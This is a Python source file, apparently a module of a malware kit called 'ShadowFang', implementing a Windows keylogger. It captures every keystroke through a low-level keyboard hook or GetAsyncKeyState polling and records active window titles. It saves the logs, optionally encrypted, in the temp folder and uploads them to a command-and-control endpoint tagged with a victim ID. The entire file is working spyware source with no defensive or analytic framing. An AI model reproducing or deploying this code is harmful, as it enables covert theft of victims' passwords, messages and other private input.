#!/usr/bin/env python3
"""
SHADOWFANG MODULES - KEYLOGGER.PY
Complete keystroke capture module
Captures all keyboard input, logs to file, uploads to C2
"""

import os
import sys
import time
import json
import base64
import ctypes
import threading
import subprocess
from ctypes import wintypes
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== KEYLOGGER CONSTANTS ====================

class KeyloggerConstants:
    """Keylogger configuration"""
    
    # Logging
    LOG_INTERVAL = 60  # Save logs every 60 seconds
    UPLOAD_INTERVAL = 300  # Upload every 5 minutes
    MAX_BUFFER_SIZE = 10000  # Max keystrokes in buffer
    MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB max log file
    
    # Output
    OUTPUT_DIR = os.path.join(
        os.environ.get('TEMP', 'C:\\Windows\\Temp'),
        'keylogs'
    )
    LOG_FILE = "keystrokes.log"
    ENCRYPTED_LOG = "keystrokes.enc"
    
    # Special keys mapping
    SPECIAL_KEYS = {
        0x08: '[BACKSPACE]',
        0x09: '[TAB]',
        0x0D: '[ENTER]',
        0x10: '[SHIFT]',
        0x11: '[CTRL]',
        0x12: '[ALT]',
        0x13: '[PAUSE]',
        0x14: '[CAPSLOCK]',
        0x1B: '[ESC]',
        0x20: ' ',
        0x21: '[PAGEUP]',
        0x22: '[PAGEDOWN]',
        0x23: '[END]',
        0x24: '[HOME]',
        0x25: '[LEFT]',
        0x26: '[UP]',
        0x27: '[RIGHT]',
        0x28: '[DOWN]',
        0x2C: '[PRTSC]',
        0x2D: '[INSERT]',
        0x2E: '[DELETE]',
        0x5B: '[LWIN]',
        0x5C: '[RWIN]',
        0x60: '[NUM0]',
        0x61: '[NUM1]',
        0x62: '[NUM2]',
        0x63: '[NUM3]',
        0x64: '[NUM4]',
        0x65: '[NUM5]',
        0x66: '[NUM6]',
        0x67: '[NUM7]',
        0x68: '[NUM8]',
        0x69: '[NUM9]',
        0x6A: '[NUM*]',
        0x6B: '[NUM+]',
        0x6D: '[NUM-]',
        0x6E: '[NUM.]',
        0x6F: '[NUM/]',
        0x70: '[F1]',
        0x71: '[F2]',
        0x72: '[F3]',
        0x73: '[F4]',
        0x74: '[F5]',
        0x75: '[F6]',
        0x76: '[F7]',
        0x77: '[F8]',
        0x78: '[F9]',
        0x79: '[F10]',
        0x7A: '[F11]',
        0x7B: '[F12]',
        0x90: '[NUMLOCK]',
        0x91: '[SCROLLLOCK]'
    }
    
    # Shift key mappings
    SHIFT_MAP = {
        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
        '`': '~'
    }

# ==================== WINDOWS HOOK KEYLOGGER ====================

class WindowsHookKeylogger:
    """Low-level keyboard hook keylogger"""
    
    def __init__(self):
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.hook_id = None
        self.hook_proc = None
        self.running = False
        self.keys_buffer = []
        self.stop_flag = False
        
        # Define callback types
        self.HOOKPROC = ctypes.WINFUNCTYPE(
            ctypes.c_long,
            ctypes.c_int,
            ctypes.wintypes.WPARAM,
            ctypes.wintypes.LPARAM
        )
        
        # Constants
        self.WH_KEYBOARD_LL = 13
        self.WM_KEYDOWN = 0x0100
        self.WM_SYSKEYDOWN = 0x0104
    
    def _keyboard_callback(self, nCode, wParam, lParam):
        """Keyboard hook callback"""
        try:
            if nCode >= 0:
                if wParam == self.WM_KEYDOWN or wParam == self.WM_SYSKEYDOWN:
                    # Extract key information
                    kb_struct = ctypes.cast(
                        lParam,
                        ctypes.POINTER(KBDLLHOOKSTRUCT)
                    ).contents
                    
                    vk_code = kb_struct.vkCode
                    scan_code = kb_struct.scanCode
                    flags = kb_struct.flags
                    timestamp = kb_struct.time
                    
                    # Process key
                    key_data = self._process_key(vk_code, scan_code, flags)
                    
                    if key_data:
                        self.keys_buffer.append(key_data)
            
            # Call next hook
            return self.user32.CallNextHookEx(
                self.hook_id,
                nCode,
                wParam,
                lParam
            )
            
        except:
            return self.user32.CallNextHookEx(
                self.hook_id,
                nCode,
                wParam,
                lParam
            )
    
    def _process_key(self, vk_code, scan_code, flags):
        """Process key and return character"""
        try:
            # Get key state
            shift_pressed = bool(self.user32.GetAsyncKeyState(0x10) & 0x8000)
            caps_lock = bool(self.user32.GetKeyState(0x14) & 0x0001)
            
            # Check for special keys
            if vk_code in KeyloggerConstants.SPECIAL_KEYS:
                return KeyloggerConstants.SPECIAL_KEYS[vk_code]
            
            # Convert to character
            char = self._vk_to_char(vk_code, shift_pressed)
            
            if char:
                # Apply caps lock
                if caps_lock and char.isalpha():
                    char = char.upper()
                
                return char
            
            return None
            
        except:
            return None
    
    def _vk_to_char(self, vk_code, shift_pressed):
        """Convert virtual key code to character"""
        try:
            # Keyboard layout
            keyboard_layout = self.user32.GetKeyboardLayout(0)
            
            # Buffer for character
            buffer = ctypes.create_unicode_buffer(4)
            
            # Convert using ToUnicodeEx
            result = self.user32.ToUnicodeEx(
                vk_code,
                0,
                None,
                buffer,
                4,
                0,
                keyboard_layout
            )
            
            if result > 0:
                char = buffer.value[0]
                
                # Apply shift mapping
                if shift_pressed and char in KeyloggerConstants.SHIFT_MAP:
                    char = KeyloggerConstants.SHIFT_MAP[char]
                
                return char
            
            return None
            
        except:
            return None
    
    def start(self):
        """Start keyboard hook"""
        try:
            self.running = True
            self.stop_flag = False
            
            # Create hook procedure
            self.hook_proc = self.HOOKPROC(self._keyboard_callback)
            
            # Get module handle
            module_handle = self.kernel32.GetModuleHandleW(None)
            
            # Set hook
            self.hook_id = self.user32.SetWindowsHookExW(
                self.WH_KEYBOARD_LL,
                self.hook_proc,
                module_handle,
                0
            )
            
            if not self.hook_id:
                logger.error("Failed to set keyboard hook")
                return False
            
            logger.info("Keyboard hook installed")
            return True
            
        except Exception as e:
            logger.error(f"Hook installation failed: {e}")
            return False
    
    def stop(self):
        """Stop keyboard hook"""
        try:
            self.stop_flag = True
            self.running = False
            
            if self.hook_id:
                self.user32.UnhookWindowsHookEx(self.hook_id)
                self.hook_id = None
            
            return True
        except:
            return False
    
    def get_buffer(self):
        """Get and clear key buffer"""
        keys = self.keys_buffer.copy()
        self.keys_buffer.clear()
        return keys

# ==================== KBDLLHOOKSTRUCT ====================

class KBDLLHOOKSTRUCT(ctypes.Structure):
    """Keyboard hook structure"""
    _fields_ = [
        ('vkCode', wintypes.DWORD),
        ('scanCode', wintypes.DWORD),
        ('flags', wintypes.DWORD),
        ('time', wintypes.DWORD),
        ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong))
    ]

# ==================== GETASYNCKEYSTATE KEYLOGGER ====================

class GetAsyncKeyStateKeylogger:
    """Polling-based keylogger using GetAsyncKeyState"""
    
    def __init__(self):
        self.user32 = ctypes.windll.user32
        self.running = False
        self.stop_flag = False
        self.poll_thread = None
        self.keys_buffer = []
        self.last_keys = set()
    
    def start(self, poll_interval=0.01):
        """Start keylogger polling"""
        if self.poll_thread and self.poll_thread.is_alive():
            return True
        
        self.running = True
        self.stop_flag = False
        
        def poll_worker():
            while not self.stop_flag:
                try:
                    # Check all virtual key codes
                    for vk_code in range(8, 256):
                        try:
                            key_state = self.user32.GetAsyncKeyState(vk_code)
                            
                            # Check if key is pressed (high bit set)
                            if key_state & 0x8000:
                                if vk_code not in self.last_keys:
                                    self.last_keys.add(vk_code)
                                    
                                    # Process key
                                    key_data = self._process_key(vk_code)
                                    
                                    if key_data:
                                        self.keys_buffer.append(key_data)
                            else:
                                self.last_keys.discard(vk_code)
                                
                        except:
                            continue
                    
                    time.sleep(poll_interval)
                    
                except:
                    time.sleep(poll_interval)
        
        self.poll_thread = threading.Thread(target=poll_worker)
        self.poll_thread.daemon = True
        self.poll_thread.start()
        
        logger.info("GetAsyncKeyState keylogger started")
        return True
    
    def _process_key(self, vk_code):
        """Process key code"""
        try:
            # Check shift state
            shift_pressed = bool(self.user32.GetAsyncKeyState(0x10) & 0x8000)
            caps_lock = bool(self.user32.GetKeyState(0x14) & 0x0001)
            
            # Special keys
            if vk_code in KeyloggerConstants.SPECIAL_KEYS:
                return KeyloggerConstants.SPECIAL_KEYS[vk_code]
            
            # Convert to character
            char = self._vk_to_char(vk_code)
            
            if char:
                if shift_pressed and char in KeyloggerConstants.SHIFT_MAP:
                    char = KeyloggerConstants.SHIFT_MAP[char]
                
                if caps_lock and char.isalpha():
                    char = char.upper()
                
                return char
            
            return None
            
        except:
            return None
    
    def _vk_to_char(self, vk_code):
        """Convert virtual key to character"""
        try:
            # Map virtual key codes to characters
            vk_map = {
                0x30: '0', 0x31: '1', 0x32: '2', 0x33: '3', 0x34: '4',
                0x35: '5', 0x36: '6', 0x37: '7', 0x38: '8', 0x39: '9',
                0x41: 'a', 0x42: 'b', 0x43: 'c', 0x44: 'd', 0x45: 'e',
                0x46: 'f', 0x47: 'g', 0x48: 'h', 0x49: 'i', 0x4A: 'j',
                0x4B: 'k', 0x4C: 'l', 0x4D: 'm', 0x4E: 'n', 0x4F: 'o',
                0x50: 'p', 0x51: 'q', 0x52: 'r', 0x53: 's', 0x54: 't',
                0x55: 'u', 0x56: 'v', 0x57: 'w', 0x58: 'x', 0x59: 'y',
                0x5A: 'z',
                0xBA: ';', 0xBB: '=', 0xBC: ',', 0xBD: '-', 0xBE: '.',
                0xBF: '/', 0xC0: '`', 0xDB: '[', 0xDC: '\\', 0xDD: ']',
                0xDE: "'", 0x20: ' ', 0x0D: '[ENTER]'
            }
            
            return vk_map.get(vk_code)
            
        except:
            return None
    
    def stop(self):
        """Stop keylogger"""
        self.stop_flag = True
        self.running = False
        
        if self.poll_thread:
            self.poll_thread.join(timeout=2)
        
        return True
    
    def get_buffer(self):
        """Get and clear buffer"""
        keys = self.keys_buffer.copy()
        self.keys_buffer.clear()
        return keys

# ==================== ACTIVE WINDOW TRACKER ====================

class ActiveWindowTracker:
    """Track active window titles"""
    
    def __init__(self):
        self.user32 = ctypes.windll.user32
        self.window_history = []
        self.current_window = None
        self.tracking = False
        self.track_thread = None
        self.stop_tracking_flag = False
    
    def get_active_window_title(self):
        """Get active window title"""
        try:
            hwnd = self.user32.GetForegroundWindow()
            
            if not hwnd:
                return None
            
            length = self.user32.GetWindowTextLengthW(hwnd)
            
            if length == 0:
                return None
            
            buffer = ctypes.create_unicode_buffer(length + 1)
            self.user32.GetWindowTextW(hwnd, buffer, length + 1)
            
            return buffer.value
            
        except:
            return None
    
    def start_tracking(self, interval=0.5):
        """Start window tracking"""
        if self.track_thread and self.track_thread.is_alive():
            return True
        
        self.tracking = True
        self.stop_tracking_flag = False
        
        def track_worker():
            while not self.stop_tracking_flag:
                try:
                    title = self.get_active_window_title()
                    
                    if title and title != self.current_window:
                        self.current_window = title
                        
                        self.window_history.append({
                            'title': title,
                            'timestamp': datetime.now().isoformat()
                        })
                    
                    time.sleep(interval)
                    
                except:
                    time.sleep(interval)
        
        self.track_thread = threading.Thread(target=track_worker)
        self.track_thread.daemon = True
        self.track_thread.start()
        
        return True
    
    def stop_tracking(self):
        """Stop window tracking"""
        self.stop_tracking_flag = True
        self.tracking = False
        
        if self.track_thread:
            self.track_thread.join(timeout=2)
        
        return True
    
    def get_window_history(self):
        """Get window history"""
        return self.window_history
    
    def clear_history(self):
        """Clear window history"""
        self.window_history.clear()
        return True

# ==================== KEYLOG SAVER ====================

class KeylogSaver:
    """Save keylog data to file"""
    
    def __init__(self):
        self.output_dir = KeyloggerConstants.OUTPUT_DIR
    
    def save_logs(self, keys, window_history=None, filename=None):
        """Save keylogs to file"""
        try:
            if not filename:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"keylog_{timestamp}.json"
            
            filepath = os.path.join(self.output_dir, filename)
            
            os.makedirs(self.output_dir, exist_ok=True)
            
            log_data = {
                'timestamp': datetime.now().isoformat(),
                'keystrokes': keys,
                'window_history': window_history or []
            }
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(log_data, f, indent=2, default=str)
            
            return filepath
            
        except:
            return None
    
    def save_raw_logs(self, keys, filename=None):
        """Save raw keylogs"""
        try:
            if not filename:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"keylog_{timestamp}.txt"
            
            filepath = os.path.join(self.output_dir, filename)
            
            os.makedirs(self.output_dir, exist_ok=True)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(''.join(keys))
            
            return filepath
            
        except:
            return None
    
    def save_encrypted(self, keys, encryption_key=None):
        """Save keylogs encrypted"""
        try:
            import base64
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            
            if not encryption_key:
                encryption_key = os.urandom(32)
            
            # Serialize keylog data
            key_data = ''.join(keys).encode()
            
            # Generate IV
            iv = os.urandom(16)
            
            # Encrypt
            cipher = Cipher(algorithms.AES(encryption_key), modes.CBC(iv))
            encryptor = cipher.encryptor()
            
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(key_data) + padder.finalize()
            
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            # Save
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(self.output_dir, f"keylog_{timestamp}.enc")
            
            with open(filepath, 'wb') as f:
                f.write(iv + encrypted_data)
            
            return filepath
            
        except:
            return None

# ==================== KEYLOG UPLOADER ====================

class KeylogUploader:
    """Upload keylogs to C2 server"""
    
    def __init__(self, communicator=None):
        self.communicator = communicator
        self.uploaded_files = []
        self.upload_queue = []
    
    def upload_keylogs(self, key_data, victim_id=None):
        """Upload keylogs to C2"""
        try:
            if self.communicator:
                payload = {
                    'type': 'keylog',
                    'data': key_data,
                    'victim_id': victim_id,
                    'timestamp': datetime.now().isoformat()
                }
                
                response = self.communicator.send_post(
                    "/api/v1/keylog",
                    payload
                )
                
                if response:
                    return True
            
            # Queue for later
            self.upload_queue.append({
                'data': key_data,
                'timestamp': datetime.now().isoformat()
            })
            
            return False
            
        except:
            return False
    
    def upload_pending(self):
        """Upload pending keylogs"""
        if not self.communicator:
            return 0
        
        uploaded = 0
        
        for item in self.upload_queue[:]:
            payload = {
                'type': 'keylog',
                'data': item['data'],
                'timestamp': item['timestamp']
            }
            
            response = self.communicator.send_post("/api/v1/keylog", payload)
            
            if response:
                self.upload_queue.remove(item)
                uploaded += 1
        
        return uploaded

# ==================== MAIN KEYLOGGER MANAGER ====================

class KeyloggerManager:
    """Main keylogger orchestrator"""
    
    def __init__(self):
        self.hook_keylogger = WindowsHookKeylogger()
        self.async_keylogger = GetAsyncKeyStateKeylogger()
        self.window_tracker = ActiveWindowTracker()
        self.saver = KeylogSaver()
        self.uploader = KeylogUploader()
        self.active = False
        self.log_thread = None
        self.stop_logging = False
        self.all_keys = []
        self.session_start = None
    
    def start(self, use_hook=True):
        """Start keylogger"""
        logger.info("Starting keylogger...")
        
        self.session_start = datetime.now()
        self.active = True
        self.stop_logging = False
        
        # Start window tracking
        self.window_tracker.start_tracking()
        
        # Start keylogger
        if use_hook:
            self.hook_keylogger.start()
        else:
            self.async_keylogger.start()
        
        # Start log saver thread
        def log_worker():
            while not self.stop_logging:
                try:
                    time.sleep(KeyloggerConstants.LOG_INTERVAL)
                    
                    # Get keys from buffer
                    if use_hook:
                        keys = self.hook_keylogger.get_buffer()
                    else:
                        keys = self.async_keylogger.get_buffer()
                    
                    if keys:
                        self.all_keys.extend(keys)
                        
                        # Save to file
                        self.saver.save_raw_logs(keys)
                        
                        # Upload if available
                        self.uploader.upload_keylogs(''.join(keys))
                        
                        logger.info(f"Logged {len(keys)} keystrokes")
                    
                except:
                    time.sleep(KeyloggerConstants.LOG_INTERVAL)
        
        self.log_thread = threading.Thread(target=log_worker)
        self.log_thread.daemon = True
        self.log_thread.start()
        
        logger.info("Keylogger active")
        return True
    
    def stop(self):
        """Stop keylogger"""
        self.stop_logging = True
        self.active = False
        
        # Stop keyloggers
        self.hook_keylogger.stop()
        self.async_keylogger.stop()
        
        # Stop window tracking
        self.window_tracker.stop_tracking()
        
        # Save final logs
        final_keys = self.hook_keylogger.get_buffer()
        if final_keys:
            self.saver.save_raw_logs(final_keys)
        
        logger.info("Keylogger stopped")
        return True
    
    def capture_now(self):
        """Capture current keystrokes"""
        keys = self.hook_keylogger.get_buffer()
        
        if keys:
            self.all_keys.extend(keys)
            return ''.join(keys)
        
        return None
    
    def get_session_keys(self):
        """Get all keys from session"""
        return ''.join(self.all_keys)
    
    def save_session(self):
        """Save entire session"""
        if self.all_keys:
            return self.saver.save_raw_logs(self.all_keys)
        return None
    
    def get_status(self):
        """Get keylogger status"""
        return {
            'active': self.active,
            'total_keys': len(self.all_keys),
            'current_window': self.window_tracker.current_window,
            'windows_tracked': len(self.window_tracker.window_history),
            'session_start': str(self.session_start)
        }
    
    def cleanup(self, max_age_hours=24):
        """Clean up old keylogs"""
        try:
            cutoff_time = time.time() - (max_age_hours * 3600)
            
            if os.path.exists(self.saver.output_dir):
                for file in os.listdir(self.saver.output_dir):
                    filepath = os.path.join(self.saver.output_dir, file)
                    
                    if os.path.getmtime(filepath) < cutoff_time:
                        os.remove(filepath)
            
            return True
        except:
            return False

# ==================== SINGLETON INSTANCE ====================

keylogger_manager = KeyloggerManager()

# ==================== EXPORT ====================

__all__ = [
    'WindowsHookKeylogger',
    'GetAsyncKeyStateKeylogger',
    'ActiveWindowTracker',
    'KeylogSaver',
    'KeylogUploader',
    'KeyloggerManager',
    'keylogger_manager'
]